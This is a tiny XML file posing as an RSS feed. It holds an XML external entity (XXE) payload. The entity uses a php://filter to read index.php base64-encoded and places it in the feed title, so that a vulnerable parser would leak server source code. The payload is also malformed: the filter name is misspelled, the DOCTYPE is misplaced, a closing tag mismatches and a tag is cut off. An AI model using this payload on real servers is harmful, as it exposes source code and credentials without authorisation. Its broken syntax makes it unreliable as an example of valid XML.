<?xml version="1.0" encoding="ISO-8859-1"?>
<rss version="2.0">
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "php://filter/read=covnert.base64-encode/resource=index.php" >]>
<channel>
    <title>&xxe;</tile>
    <link>mypass</link>
    <de
</channel>
</rss>
